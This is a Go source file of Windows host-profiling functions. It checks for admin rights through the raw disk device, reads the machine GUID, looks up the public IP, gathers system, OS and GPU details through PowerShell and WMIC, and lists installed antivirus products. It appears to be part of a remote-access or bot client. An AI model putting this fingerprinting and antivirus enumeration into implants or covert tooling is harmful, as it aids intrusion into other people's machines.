package core

import (
	"bytes"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
)

var (
	AdminState bool   = false
	MyID       string = ""
)

func CheckPrivilege() {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		AdminState = false
	} else {
		AdminState = true
	}
}

func MachineID() (string, error) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Cryptography`, registry.QUERY_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return "", err
	}
	defer k.Close()

	s, _, err := k.GetStringValue("MachineGuid")
	if err != nil {
		return "", err
	}
	return s, nil
}

func GetClientIP() string {
	rsp, _ := http.Get("https://checkip.amazonaws.com/")
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := ioutil.ReadAll(rsp.Body)
		return string(bytes.TrimSpace(buf))
	}
	return "127.0.0.1"
}

func GetSystemInfo() string {
	PSVer, _ := GetRegistryKeyValue(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine", "PowerShellVersion")
	s := strings.Split(PSVer, ".")
	major, _ := strconv.Atoi(s[0])
	minor, _ := strconv.Atoi(s[1])
	var output string
	if major >= 5 && minor >= 1 {
		output = IssuePowershell("Get-ComputerInfo | more | ConvertTo-Json")
	} else {
		output = IssuePowershell("systeminfo | more | ConvertTo-Json")
	}
	return output
}
func GetAntiVirus() string {
	var AVs string
	list := IssuePowershell(`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`)
	if strings.Contains(list, "=") {
		AV := strings.Split(list, "displayName=")
		for i := range AV {
			if len(AV) >= 1 {
				AVs = AVs + AV[i] + "|"
			} else {
				AVs = AV[i]
			}
		}
		return StripSpaces(AVs)
	} else {
		return "None Found"
	}
}

func GetOS() string {
	return strings.Replace(IssuePowershell("wmic os get Caption /value\n"), "Caption=", "", -1)
}

func GetGPU() string {
	return strings.Replace(IssuePowershell("wmic path win32_VideoController get name"), "Name", "", -1)
}

func GetClientPath() string {
	return os.Args[0]
}
